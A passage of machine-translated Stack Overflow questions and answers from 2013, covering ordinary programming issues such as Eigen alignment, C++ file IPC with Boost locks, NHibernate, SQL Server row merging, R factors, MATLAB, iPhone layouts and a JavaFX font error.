[with T = float, int Size = 12, int MatrixOrArrayOptions = 0]: Assertion `(reinterpret_cast<size_t>(array) & 0xf) == 0
&& "this assertion is explained here: " "http://eigen.tuxfamily.org/dox-devel/TopicUnalignedArrayAssert.html" " **** READ THIS WEB PAGE !!! ****"' failed.
Aborted 
```

我应该如何解决这个问题？（我已经包含了`EIGEN_MAKE_ALIGNED_OPERATOR_NEW`宏。）

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-20T12:23:07.723

我不知道 LEMON 库，但如果 ListGraph::EdgeMap 允许您指定分配器，那么您必须使用我们的[对齐分配器](http://eigen.tuxfamily.org/dox-devel/group__TopicStlContainers.html)。

否则，您必须为您的成员放弃矢量化，如下所示：

```
struct EdgeStatus
{
  Matrix<float,3,4, Eigen::DontAlign> Data;
  // ...
}; 
```

# c++ - 如何在 C++ 中同时写入和读取文件

> ID：14977504
> 
> 赞同：1
> 
> 时间：2013-02-20T10:25:29.193
> 
> 标签：c++, file-io, concurrency, ipc

我需要编写两个程序`write.cpp`并`read.cpp`同时运行。其中一个写入（覆盖）文件，另一个从文件中读取。

基本上，文件中总是只有一行。

`write.cpp`成功执行操作但`read.cpp`不显示任何内容。使用`tail -f`也显示不正确的结果。

### 写.cpp：

```
#include <stdio.h>
#include <ctime>
#include <unistd.h>
#include <iostream>
#include <fstream>
#include <string>
using namespace std;

int main () {
  ofstream myfile;
  int i = 70;
  char c;
  while(i <85)
  {
      myfile.open ("example.txt");
      c = i++;
      myfile << c << endl;
      myfile.close();
      sleep(1);
  }
  return 0;
} 
```

### 读取.cpp：

```
#include <iostream>
#include <fstream>
#include <string>
#include <unistd.h>

using namespace std;

int main () {
  string line;
  ifstream myfile ("example.txt");
  if (myfile.is_open())
  {
    while ( myfile.good() )
    {
      sleep(1);
      getline (myfile,line);
      cout << line << endl;
    }
    myfile.close();
  }

  else cout << "Unable to open file";

  return 0;
} 
```

我可以知道这两个程序的哪一部分导致了问题，我该如何解决？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-20T10:30:37.343

您在编写器中做的是正确的事情，但是一旦您读取到文件末尾，输入流将变得不可用，直到`fail`条件设置好。最好的解决方案可能是完全按照您在编写器中所做的事情：每次在读取循环中打开和关闭文件。

请注意，文件有时会为空；当您在 writer 中打开要写入的文件时，它会被截断，如果 reader 恰好在这个时刻尝试读取，它会找到一个空文件。（这不是什么大问题；只要注意它，`sleep`如果你发现一个空行，可能会跳过。）

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-21T05:22:09.873

为了在我对[您之前的问题](https://stackoverflow.com/questions/14971546/how-to-read-time-from-a-file-without-converting/14971684#14971684)[的回答](https://stackoverflow.com/a/14971684/78845)中添加一些细节，如果您坚持使用[ipc](/questions/tagged/ipc "show questions tagged 'ipc'")文件，您可以使用[Boost 的进程间通信](http://www.boost.org/doc/libs/release/doc/html/boost/interprocess/interprocess_exception.html)来实现这一点。

作家可能看起来像这样：

```
#include <boost/interprocess/sync/file_lock.hpp>
#include <boost/interprocess/sync/scoped_lock.hpp>
#include <fstream>
#include <iostream>

int main()
{
    using namespace boost::interprocess;
    std::string line, shared_filename = "shared";

    {
        std::ofstream create_shared_file(shared_filename.c_str());
    }

    for (;;)
    {
        std::cout << "Enter some text: ";
        std::cin >> line;

        try
        {
            file_lock lock(shared_filename.c_str());
            scoped_lock<file_lock> lock_the_file(lock);

            std::ofstream shared_file(shared_filename.c_str(), std::ofstream::trunc);
            shared_file << line << std::endl;
            shared_file.flush();
        }
        catch (interprocess_exception const& e)
        {
            std::cerr << e.what() << std::endl;
        }
    }
} 
```

对应的阅读器：

```
#include <boost/interprocess/sync/file_lock.hpp>
#include <boost/interprocess/sync/sharable_lock.hpp>
#include <fstream>
#include <iostream>
#include <unistd.h>

int main()
{
    using namespace boost::interprocess;
    std::string line, shared_filename = "shared";

    for (;;)
    {
        try
        {
            file_lock lock(shared_filename.c_str());
            std::cout << "Waiting for file lock..." << std::endl;
            sharable_lock<file_lock> lock_the_file(lock);
            std::cout << "Acquired file lock..." << std::endl;

            std::ifstream shared_file(shared_filename.c_str());
            shared_file >> line;

            if (line.empty())
            {
                std::cout << "Empty file" << line << std::endl;
            }
            else
            {
                std::cout << "Read: " << line << std::endl;
            }
        }
        catch (interprocess_exception const& e)
        {
            std::cerr << "Could not lock " << shared_filename << ": " << e.what() << std::endl;
        }

        std::cout << "Sleeping..." << std::endl;
        sleep(2);
    }
} 
```

# c# - 在 NHibernate 中选择没有多对多关系的项目？

> ID：14977508
> 
> 赞同：0
> 
> 时间：2013-02-20T10:25:38.517
> 
> 标签：c#, nhibernate, queryover

我有这个数据库结构：

```
Products
    ProductId

Categories
    CategoryId

ProductsInCategories
    ProductId
    CategoryId 
```

我需要找到所有不在一个类别中的产品。现在，我使用以下代码：

```
var results = Session
    .CreateCriteria<Product>()
    .List<Product>()
    .Where(product=> !product.Categories.Any())
    .ToList(); 
```

所以我返回数据库中的所有产品，然后过滤它们。这是低效的，我需要一个更好的方法。

我试过这段代码：

```
var res = Session.QueryOver<Product>()
    .Left.JoinQueryOver(product=> product.Categhories)
    .Where(categories => !categories.Any())
    .TransformUsing(Transformers.DistinctRootEntity)
    .List(); 
```

但它根本没有用。我尝试了一些变化，但也没有用。

我应该如何使用 NHibernate 执行此查询？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-20T12:58:19.173

尝试这个：

```
var res = Session.QueryOver<Product>()
    .WhereRestrictionOn(x => x.Categories).IsEmpty()
    .List(); 
```

# php - 将每个单词分成一个数组

> ID：14977512
> 
> 赞同：0
> 
> 时间：2013-02-20T10:25:45.400
> 
> 标签：php

我有一个文件，内容如下：

苹果100

香蕉 200

猫 300

我想在文件中搜索特定字符串并获取下一个单词。例如：我搜索 cat，我得到 300。我已经查找了这个解决方案：[How to Find Next String After the Needle Using Strpos()](https://stackoverflow.com/questions/4866968/how-to-find-next-string-after-the-needle-using-strpos)，但这没有帮助，我没有得到预期的输出。如果您可以在不使用正则表达式的情况下提出任何方法，我会很高兴。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-20T10:50:58.487

我不确定这是最好的方法，但是根据您提供的数据，它会起作用。

1.  [使用fopen()](http://php.net/manual/en/function.fopen.php)获取文件内容
2.  [使用explode()](http://php.net/manual/en/function.explode.php)将值分隔为数组元素
3.  遍历您的数组并检查每个元素的索引是奇数还是偶数。复制到新数组。

不完美，但在正确的轨道上。

```
<?php
$filename = 'data.txt'; // Let's assume this is the file you mentioned
$handle = fopen($filename, 'r');
$contents = fread($handle, filesize($filename));
$clean = trim(preg_replace('/\s+/', ' ', $contents));
$flat_elems = explode(' ', $clean);

$ii = count($flat_elems);
for ($i = 0; $i < $ii; $i++) {
    if ($i%2<1) $multi[$flat_elems[$i]] = $flat_elems[$i+1];
}

print_r($multi); 
```

这会输出一个像这样的多维数组：

```
Array
(
    [Apple] => 100
    [banana] => 200
    [Cat] => 300
) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-20T10:49:52.717

You might benefit from using named regex subpatterns to capture the information you're looking for.

For example you, finding a number the word that is its former (1 <= value <= 9999)

```
/*String to search*/
$str = "cat 300";
/*String to find*/
$find = "cat";
/*Search for value*/
preg_match("/^$find+\s*+(?P<value>[0-9]{1,4})$/", $str, $r);
/*Print results*/
print_r($r); 
```

In cases where a match is found the results array will contain the number you're looking for indexed as 'value'.

This approach can be combined with

```
file_get_contents($file); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-20T10:35:08.400

试试这个，它不使用正则表达式，但如果您要搜索的字符串较长，它会效率低下：

```
function get_next_word($string, $preceding_word)
{
  // Turns the string into an array by splitting on spaces
  $words_as_array = explode(' ', $string); 

  // Search the array of words for the word before the word we want to return
  if (($position = array_search($preceding_word, $words_as_array)) !== FALSE)
    return $words_as_array[$position + 1]; // Returns the next word
  else
    return false; // Could not find word
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-20T10:37:11.303

```
$find = 'Apple';
preg_match_all('/' . $find . '\s(\d+)/', $content, $matches);
print_r($matches); 
```

# c#-4.0 - 用于自动化网站的 C# 代码

> ID：14977514
> 
> 赞同：-1
> 
> 时间：2013-02-20T10:25:46.560
> 
> 标签：c#-4.0

我想要的只是记录我在网站上执行的操作，并且必须在 c# 中为相同的操作生成代码。为了清楚起见，我只想运行代码以便自动执行手动活动。任何帮助都会很棒。非常感谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-20T10:41:51.933

1.  `Visual Studio`有[网络测试记录](http://msdn.microsoft.com/en-us/library/ms182539%28v=VS.80%29.aspx)，它实际上可以为你生成代码。这将记录浏览器和服务器之间的集成。所以如果你重新运行，服务器会认为你正在做某事。此选项不是浏览器自动化。

2.  [WatiN](http://watin.org/)是另一种选择。这一次，它是浏览器自动化工具。它也有[录音工具](http://watintestrecord.sourceforge.net/)。

3.  第三个选项是[Selenium](http://docs.seleniumhq.org/)，与 WatiN 非常相似。有很多工具可以记录 Selenium 脚本。最受支持的是[Selenium IDE](http://docs.seleniumhq.org/projects/ide/)。

所有工具都非常易于使用，您可以在各自的网站上找到很好的教程。

我最好的猜测是，您需要#2 或#3。看起来#3 是更活跃/成熟的工具，但我成功地使用了这两种工具，所以选择#2 没问题。

如果您选择#1，请检查`Visual Studio`您使用的版本。恐怕，Web 测试只能在顶级版本中使用，例如`Ultimate`.

# sql-server - 将两条记录合并为一条

> ID：14977520
> 
> 赞同：0
> 
> 时间：2013-02-20T10:25:57.533
> 
> 标签：sql-server, stored-procedures, coalesce

我有一个存储两个值的表；每个客户的“总计”和“欠”。使用两个文件将数据上传到表中，一个带入“total”，另一个带入“owing”。这意味着我对每个 customerID 有两条记录：

```
customerID:--------Total:--------- Owing:

1234----------------  1000----------NULL

1234-----------------NULL-----------200 
```

我想编写一个将两条记录合并在一起的存储过程：

```
customerID:--------Total:--------- Owing:

1234----------------  1000----------200 
```

我见过使用 COALESCE 的例子，所以把这样的东西放在一起：

```
BEGIN

-- SET NOCOUNT ON added to prevent extra result sets from
-- interfering with SELECT statements.
SET NOCOUNT ON;

--Variable declarations

DECLARE @customer_id varchar(20)
DECLARE @total decimal(15,8)
DECLARE @owing decimal(15,8)
DECLARE @customer_name_date varchar(255)
DECLARE @organisation varchar(4)
DECLARE @country_code varchar(2)
DECLARE @created_date datetime

--Other Variables
DECLARE @totals_staging_id int

--Get the id of the first row in the staging table
SELECT @totals_staging_id = MIN(totals_staging_id)
from TOTALS_STAGING

--iterate through the staging table
WHILE @totals_staging_id is not null
BEGIN

update TOTALS_STAGING

SET 
total = coalesce(@total, total),
owing = coalesce(@owing, owing)

where totals_staging_id = @totals_staging_id

END
END 
```

有任何想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-20T12:15:45.827

```
SELECT t1.customerId, t1.total, t2.owing FROM test t1 JOIN test t2 ON ( t1.customerId = t2.customerId) WHERE t1.total IS NOT NULL AND t2.owing IS NOT NULL 
```

想知道为什么不只是`UPDATE`在第二个文件执行上使用？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-07-20T22:04:49.933

This should work:

```
SELECT CustomerID, 
       COALESCE(total1, total2) AS Total, 
       COALESCE(owing1, owing2) AS Owing
FROM 
(SELECT row1.CustomerID AS CustomerID,
        row1.Total AS total1,
        row2.Total AS total2,
        row1.Owing AS owing1,
        row2.Owing AS owing2
FROM YourTable row1 INNER JOIN YourTable row2 ON row1.CustomerID = row2.CustomerID
WHERE row1.Total IS NULL AND row2.Total IS NOT NULL) temp
--Note:  Alter the WHERE clause as necessary to ensure row1 and row2 are unique. 
```

...but note that you'll need some mechanism to ensure row1 and row2 are unique. My WHERE clause is an example based on the data you provided. You'll need to tweak this to add something more specific to your business rules.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-20T10:37:24.007

> 除了 COUNT，聚合函数忽略空值。聚合函数经常与 SELECT 语句的 GROUP BY 子句一起使用。[MSDN](http://msdn.microsoft.com/en-us/library/ms173454.aspx)

因此，您无需担心求和的空值。下面将把你的 **合并记录放在一起**。[小提琴演示](http://sqlfiddle.com/#!3/b606d/3)

```
select customerId,
       sum(Total) Total,
       sum(Owing) Owing
from T
Group by customerId 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-20T11:04:09.553

尝试这个 ：

```
CREATE TABLE #Temp
(
  CustomerId int,
  Total int,
  Owing int
)

insert into #Temp
values (1024,100,null),(1024,null,200),(1025,10,null)

Create Table #Final 
(
  CustomerId int,
  Total int,
  Owing int
)

insert into #Final
values (1025,100,50)

MERGE #Final AS F
USING 
(SELECT customerid,sum(Total) Total,sum(owing) owing FROM #Temp
 group by #Temp.customerid
) AS a

ON (F.customerid = a.customerid)
WHEN MATCHED THEN UPDATE SET F.Total = F.Total + isnull(a.Total,0)
                              ,F.Owing = F.Owing + isnull(a.Owing,0)
WHEN NOT MATCHED THEN
INSERT (CustomerId,Total,Owing)
VALUES (a.customerid,a.Total,a.owing);

select * from #Final

drop table #Temp
drop table #Final 
```

# r - 数据框中的 str() 函数

> ID：14977524
> 
> 赞同：1
> 
> 时间：2013-02-20T10:26:03.103
> 
> 标签：r, dataframe, sas

我正在从 R 中的数据框中删除一个变量；此后检查输出如下：

步骤1：

```
str(bill_11)
'data.frame':   403771 obs. of  11 variables:

$ Month          : Factor w/ 4 levels "Apr-12","Feb-12",..: 2 2 2 2 2 2 2 2 2 2 ...

Apr-12 Feb-12 Mar-12 May-12 
81891 103668 118070 100142 
```

第2步：

```
feb_bill  <- bill_11[which(bill_11$Month == "Feb-12"),]
str(feb_bill)
'data.frame':   103668 obs. of  11 variables:

 $ Month      : Factor w/ 4 levels "Apr-12","Feb-12",..: 2 2 2 2 2 2 2 2 2 2 ...

Apr-12 Feb-12 Mar-12 May-12 
 0 103668      0      0 
```

我的问题是；我已经删除了因子月份的 3 个级别，**但是新的数据框仍然显示“月份”有 4 个级别。虽然子集操作是正确的，但我有一些疑问。

我最近使用 R，与 SAS 相比。是 R str() 函数的功能还是 .something 错误？谢谢你的帮助。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-20T10:47:10.877

因子水平保持在子集上。要删除它们，请使用`droplevels`，例如：

```
feb_bill  <- droplevels(bill_11[which(bill_11$Month == "Feb-12"),]) 
```

这将从 data.frame 中的所有因子变量中删除所有未使用的级别。要维护特定变量的水平，请使用`except`参数。

# javascript - Highcharts如何使用时间百分比面积

> ID：14977527
> 
> 赞同：1
> 
> 时间：2013-02-20T10:26:17.137
> 
> 标签：javascript, highcharts

对于我的一个项目，我需要使用百分比区域（Highcharts js）来按天显示数据，但我没有设法转换 Highcharts 给出的示例。

基本上，我希望这个（[http://www.highcharts.com/demo/area-stacked-percent](http://www.highcharts.com/demo/area-stacked-percent)）在 x 轴上具有 24 小时的范围。

有人可以举个例子吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-20T10:59:32.147

看看下面总结的这个[jsFiddle](http://jsfiddle.net/VYraZ/)

```
$(function () {
    var chart = new Highcharts.Chart({
        chart: {
            renderTo: 'container',
            type:'area'
        },
        xAxis: {
            type: 'datetime'
        },

        plotOptions: {
            series: {
                pointStart: Date.UTC(2010, 0, 1),
                pointInterval: 24 * 3600 * 1000 // one day
            },

                area: {
                    stacking: 'percent',
                    lineColor: '#ffffff',
                    lineWidth: 1,
                    marker: {
                        lineWidth: 1,
                        lineColor: '#ffffff'
                    }
                }
            },

        series: [{
            data: [29.9, 71.5, 106.4, 129.2, 144.0, 176.0, 135.6, 148.5, 216.4, 194.1,     95.6, 54.4]
        }, {
            data: [144.0, 176.0, 135.6, 148.5, 216.4, 194.1, 95.6, 54.4, 29.9, 71.5,     106.4, 129.2]
        }]
    });
}); 
```

编辑：我想更具体地了解这些日子，构建您的系列数据，如下[所示](http://jsfiddle.net/VYraZ/3/)

```
data: [{x:Date.UTC(2010, 0, 1),y:29.9},  {x:Date.UTC(2010, 0, 2),y:71.5},    
       {x:Date.UTC(2010, 0, 3),y:106.4}, {x:Date.UTC(2010, 0, 4),y:129.2}, 
       {x:Date.UTC(2010, 0,5),y:144.0},  {x:Date.UTC(2010, 0, 6),y:176.0}, 
       {x:Date.UTC(2010, 0, 7),y:135.6}, {x:Date.UTC(2010, 0, 8),y:148.5}, 
       {x:Date.UTC(2010, 0, 9),y:216.4}, {x:Date.UTC(2010, 0, 10),y:194.1}, 
       {x:Date.UTC(2010, 0, 11),y:95.6}, {x:Date.UTC(2010, 0, 12),y:54.4}
] 
```

小心在两个系列中拥有每天的数据（甚至是 0），否则你会让渲染器发疯......

# visual-studio - Visual Studio 2012 新项目模板不可见

> ID：14977531
> 
> 赞同：0
> 
> 时间：2013-02-20T10:26:28.880
> 
> 标签：visual-studio, visual-studio-2012, visual-studio-templates

我的 Visual Studio 2012 没有显示任何语言的模板。我怎样才能恢复它或其他可能的解决方案来使它正确..

![在此处输入图像描述](../Images/eabcf55415ec6b8c555e69600da214b3.png)

# matlab - 如何从矩阵中仅删除所需的行并使用matlab返回矩阵的其余行

> ID：14977534
> 
> 赞同：0
> 
> 时间：2013-02-20T10:26:41.583
> 
> 标签：matlab

我想让输出只删除一行并使用 matlab 返回其余行。例如：考虑一个矩阵

```
A = [1  1  1; 2  2  2; 3  3  3; 4  4  4] 
```

对于 case1，我需要一个单独的矩阵，其中第一个矩阵显示所需的行，其他矩阵显示其余行。

就像`B=1`然后输出将是两个矩阵，其中第一个矩阵将是

```
C = [1  1  1] 
```

另一个矩阵将是

```
D = [2  2  2; 3  3  3; 4  4  4] 
```

同样在下一个案例中`B=2`

然后

```
C = [2  2  2]
D = [1  1  1; 3  3  3; 4  4  4] 
```

如何为这种情况编写 matlab 程序？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-20T10:37:03.727

试试这个，给定你的定义`A`和`B`

```
C = A(B,:)
D = A(setdiff(1:size(A,1),B),:) 
```

我希望您可以轻松地将它们包装成一个函数。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-20T10:43:07.490

我想你正在寻找这样的东西

```
 A =

 1     1     1
 2     2     2
 3     3     3
 4     4     4

row=2;
A(row,:)=[]

A =

 1     1     1
 3     3     3
 4     4     4 
```

为了保留原始矩阵并保存行，我将使用以下函数：

```
function [ A,out_row ] = removerow( A,row )
%row is the number of the row you want to remove, and 
%A is the matrix you want it removed from.
out_row=A(row,:);
A(row,:)=[];
end 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-20T10:39:14.237

您可以通过这种方式提取一行：

```
C = A(1,:)
C =

   1   1   1 
```

您可以以这种方式提取多行 2:4 扩展为 [ 2 3 4 ]

```
D = A(2:4,: )
D =

   2   2   2
   3   3   3
   4   4   4 
```

'A(1, :) 中的第二个冒号扩展到所有可用列。

希望这可以帮助

# tfs - Github 喜欢 TFS 的差异视图

> ID：14977542
> 
> 赞同：0
> 
> 时间：2013-02-20T10:27:14.037
> 
> 标签：tfs, diff, changeset

我一直在网上和 SO 上寻找一种工具和/或本机方式，让我的 TFS 服务器向我展示一个变更集中的所有文件差异，就像 Github 所做的那样。不幸的是，我无法找到任何有用的信息。谁能指出我的方向，或者是为此目的编写我自己的 VS-TFS 插件的唯一解决方案？

对于那些不知道它在 github 上的样子的人： ![在此处输入图像描述](../Images/ed9b9ede89486c613db54b1a2bd36fce.png)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-22T02:20:07.840

您使用的是什么版本的 TFS？TFS 的托管版本最近获得了此功能。查看 tfs.visualstudio.com 并创建一个帐户。变更集视图提供了与 GitHub 提供的功能类似的功能。

tfs.visualstudio.com 最近还推出了托管 Git 存储库，因此如果您希望这样做，您可以将所有代码存储在一个地方。

# iphone - 用户界面在 iPhone 4 中看起来不错，但在 iPhone5 中设置不正确

> ID：14977543
> 
> 赞同：0
> 
> 时间：2013-02-20T10:27:15.630
> 
> 标签：iphone, ios

我已经使用 ios 5 创建了一个应用程序，并且所有用户界面都是为`320*480`分辨率而创建的，现在我正在尝试在 iPhone 5 中运行这个应用程序，而不是我使用创建的所有控件都`IB`没有正确显示我已经检查过教程关于[mobiletut](http://mobile.tutsplus.com/tutorials/iphone/working-with-the-iphone-5-display/)如何在 iphone 5 用户界面中创建，但它只为以编程方式创建的控件提供解决方案，而不是为由创建的控件提供解决方案`IB`，因此对此主题有任何帮助。

iphone 4s 图片：

![在此处输入图像描述](../Images/c10453505f93183ba081462f53785033.png)

iphone 5 图片：

![在此处输入图像描述](../Images/f470457d4f16e172d1a97b1a0d19c994.png)

请忽略 iphone 5 img 中的小图像问题，我正在构建分辨率为 640*1136 的图像。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-20T11:00:59.450

我遇到了类似的问题。

这就是我解决问题的方法。

1) 放置 Default-568h@2x.png

2）为imageview设置一个属性并合成它，它是imageView的IBOutlet并连接它。

3）在viewdidload函数中

一个例子：

```
CGRect screenBounds = [[UIScreen mainScreen] bounds];
    if (screenBounds.size.height == 568) {
        // code for 4-inch screen
        _backgroundimageView.frame = CGRectMake(0,0,320,460);
        [_backgroundimageView setImage:[UIImage imageNamed:@"image1-568h@2x.png"]];
    } else {
        // code for 3.5-inch screen
         _backgroundimageView.frame =CGRectMake(0,0,320,370);
        [_backgroundimageView setImage:[UIImage imageNamed:@"image1.png"]];
    } 
```

添加 Default-568h@2x.png 时，标签栏和导航栏将分别向下和向上移动。留在中心图像..调整大小..希望这有帮助..

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-20T11:55:39.583

在 iOS 5 中，您可以使用 Utilities 工具栏中的 Size 面板来设置控件的距离或大小，因为视图控制器会更改大小。

![xCode 截图](../Images/08c0c9fe80fd5b8291dcf0788fb6ebd9.png)

如果您更改`I`，它将固定与屏幕顶部或侧面的距离。通过更改箭头，它将随着屏幕大小的变化而调整大小。

您需要将 AutoSizing 设置为如下图所示，并且您应该得到您想要的。

如果您将鼠标放在右侧的示例图像上，您可以预览视图控制器扩展和收缩时的外观

对于 iOS 6 应用程序，您应该使用约束。[http://www.raywenderlich.com/20881/beginning-auto-layout-part-1-of-2](http://www.raywenderlich.com/20881/beginning-auto-layout-part-1-of-2)上有一篇非常好的文章

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-20T10:41:11.450

正如 apascua 所说，您必须为 Retina 4 英寸设置默认启动图像。

顺便说一句，我认为管理 iPhone 4 和 iPhone 5 的多个接口的最佳解决方案是创建两个不同的 xib，一个被调用`MyView_iPhone5.xib`，另一个被调用`MyView_iPhone4.xib`，并通过一个实用程序类来管理它，该方法根据设备返回正确的 xib 名称应用程序正在运行。

检查这个要点：

[https://gist.github.com/andrealufino/4994648](https://gist.github.com/andrealufino/4994648)

当您需要调用 nib 时，您可以使用这行代码

```
MyViewController *controller = [[MyViewController alloc] initWithNibName:[Utility nibName:@"MyNibName"] bundle:nil]; 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-20T10:29:12.030

如果您来自 3.5 英寸显示器项目，您似乎必须为 4 英寸显示器设置启动图像才能工作。

![在此处输入图像描述](../Images/0bb68fc07cf853734b27e104ebe3f891.png)

# kinect - 用于 NiTE/OpenNI 2/1.5 的 Java？

> ID：14977545
> 
> 赞同：2
> 
> 时间：2013-02-20T10:27:18.460
> 
> 标签：kinect, openni

一直在网上搜索 Windows（最好是 Mac）上 Kinect 的最佳 Java 开发设置。

我认为 OpenNI/NiTE 2 是我的解决方案，在 Windows 上使用 Kinect 驱动程序，并且（直到出现 kinect 驱动程序）有可能（使用后来的 MS SDK）在具有相同设置的 mac 上运行并行虚拟机。但是，我发现 OpenNI/NiTE v2 没有附带 java 包装器。

首先，某处是否有 OpenNI2/NiTE2 的 java 包装器？

其次，我希望听到一些经验

*   v2 和以前的版本之间的差异是否如此之大，以至于我应该把它吸起来并在 c++ 中进行较慢的开发？
*   一般的跟踪、近距离模式和坐姿跟踪、其他开发工具，在最新的 MS SDK 中有这么大的优势，我应该考虑使用 MS SDK，即使我以后不想被锁定在 Windows 上？

# linux - 启动时 JavaFX NullPointerException

> ID：14977546
> 
> 赞同：3
> 
> 时间：2013-02-20T10:27:24.573
> 
> 标签：linux, javafx

我正在尝试使用从 Eclipse 或命令行运行的 Linux（我有正确版本的 GTK）上的 Oracle JVM（1.7u13）运行一个非常简单的 JavaFX 程序。当它开始时，它会抛出一个关于字体的异常抱怨。Font.getDefault() 也可能导致相同的 NPE。我可以使用 Font.getFontNames() 列出可用的字体，我可以看到 17 种字体，包括我认为是默认设置的“系统常规”。

任何想法都非常感谢！

堆栈跟踪....

```
    线程“主”java.lang.RuntimeException 中的异常：应用程序启动方法中的异常
        在 com.sun.javafx.application.LauncherImpl.launchApplication1(LauncherImpl.java:403)
        在 com.sun.javafx.application.LauncherImpl.access$000（LauncherImpl.java:47）
        在 com.sun.javafx.application.LauncherImpl$1.run(LauncherImpl.java:115)
        在 java.lang.Thread.run(Thread.java:722)
    引起：java.lang.NullPointerException
        在 com.sun.t2k.LogicalFont.(LogicalFont.java:172)
        在 com.sun.t2k.LogicalFont.getLogicalFont(LogicalFont.java:104)
        在 com.sun.t2k.LogicalFont.getLogicalFont(LogicalFont.java:144)
        在 com.sun.t2k.T2KFontFactory.createFont(T2KFontFactory.java:356)
        在 com.sun.prism.j2d.J2DFontFactory.createFont(J2DFontFactory.java:38)
        在 com.sun.javafx.font.PrismFontLoader.loadFont(PrismFontLoader.java:399)
        在 javafx.scene.text.Font.(Font.java:282)
        在 javafx.scene.text.Font.getDefault(Font.java:85)
        在 com.me.FXProblem.start(FXProblem.java:23)
        在 com.sun.javafx.application.LauncherImpl$5.run(LauncherImpl.java:319)
        在 com.sun.javafx.application.PlatformImpl$5.run(PlatformImpl.java:215)
        在 com.sun.javafx.application.PlatformImpl$4$1.run(PlatformImpl.java:179)
        在 com.sun.javafx.application.PlatformImpl$4$1.run(PlatformImpl.java:176)
        在 java.security.AccessController.doPrivileged（本机方法）
        在 com.sun.javafx.application.PlatformImpl$4.run(PlatformImpl.java:176)
        在 com.sun.glass.ui.InvokeLaterDispatcher$Future.run(InvokeLaterDispatcher.java:76)
        在 com.sun.glass.ui.gtk.GtkApplication._runLoop（本机方法）
        在 com.sun.glass.ui.gtk.GtkApplication$3$1.run(GtkApplication.java:82)
        ... 1 更多

```

## 更新

获取错误的示例代码。我假设 Font.getDefault() 的路由原因是导致几个非常简单的 UI 节点不显示的原因。

```
 package com.me;

    import javafx.application.Application;
    import javafx.scene.text.Font;
    import javafx.stage.Stage;

    /**
     * Problem class to show the stack trace from Font.getDefault()
     */
    public class FXProblem extends Application
    {
        /**
         * {@inheritDoc}
         */
        @Override
        public void start(final Stage stage) throws Exception
        {
            Font.getDefault();
        }

        /**
         * Main.
         */
        public static void main(final String[] args)
        {
            launch();
        }
    } 

```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-20T20:17:35.773

看起来像 JavaFX 2.2 的一个已知（当前打开）问题：

[尝试在 Slackware linux 上加载默认字体时出现 RT-28405 NPE](http://javafx-jira.kenai.com/browse/RT-28405)

使用上述错误跟踪链接需要登录，但任何人都可以注册。

* * *

复制（只是复制和过去）这里问题的一些评论，这样临时用户不需要注册错误跟踪器就可以访问它们：

*用户提交的解决方法*

> 我设法通过简单地将 TTF 目录添加到 /usr/share/fonts 并将至少一个 .ttf 文件添加到该目录来解决这个问题。(/usr/share/fonts/TTF/somefont.ttf) 以前 /usr/share/fonts 中唯一的其他目录是 Type1。(/usr/share/fonts/Type1)

*开发者提供的背景信息*

> 由于向 /usr/share/fonts 添加 TTF 字体是可行的，因此我们似乎成功地使用 /usr/libfontconfig 来定位已安装的字体，但显然没有我们喜欢的字体。即 FX 不支持 Type 1 字体（政策决定），仅支持 TrueType 和 OpenType/CFF 字体。您使用的是 OpenJDK 还是 Oracle JDK？我敢打赌，与 slackware OpenJDK 捆绑在一起的 OpenJDK 没有自己的字体，而 OracleJDK 有一些自己的 TrueType 字体，所以不会遇到这个问题。这里的底线似乎是您应该安装一套像样的 TrueType 字体。我认为我们唯一能做的就是在发生这种情况时改进诊断。

*用户提供的环境信息*

> 我使用的是 Oracle 的 JDK，所以我很惊讶地遇到了这个问题。( 7u10 ) 但我同意你的评估，安装新字体来解决这个问题没什么大不了的，只是很难弄清楚这就是问题所在。（因为我们确实安装了其他字体）如果您能检测到这个问题并提供更好的反馈，从我的角度来看，这是可以接受的。谢谢！

# javascript - ActiveXObject 错误

> ID：14977553
> 
> 赞同：0
> 
> 时间：2013-02-20T10:27:43.867
> 
> 标签：javascript, xml, cross-browser, activex

我必须在我的站点中使用 ActiveXObject。我读过这仅适用于 IE，但有什么方法可以解决这个问题吗？因为我需要从服务器获取 XML，而这家公司告诉我使用这样的代码来检索 XML 中的数据

```
<script type="text/javascript">
var g_XMLReq = new ActiveXObject("Microsoft.XMLHTTP");
g_XMLReq.open("POST", "LINK",false);
g_XMLReq.send(unsescape(XMLdata));
</script> 
```

我认为这是不可能逃避这个问题的？我只能用IE？！浏览网站的用户呢？并不是所有人都只用了一小部分IE。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-20T10:31:45.077

[XMLHttpRequest 的非 ActiveX 版本](https://developer.mozilla.org/en-US/docs/DOM/XMLHttpRequest/Using_XMLHttpRequest)已在浏览器中使用多年。甚至 Internet Explorer 从第 7 版开始就支持本机版本。您似乎已经收到了一些早于 2006 年的说明。

替换`new ActiveXObject("Microsoft.XMLHTTP");`为`new XMLHttpRequest()`。（除非您需要支持 IE 5/6，在这种情况下您必须尝试/捕捉它和 ActiveX 版本）

# regex - 正则表达式找不到匹配项

> ID：14977555
> 
> 赞同：0
> 
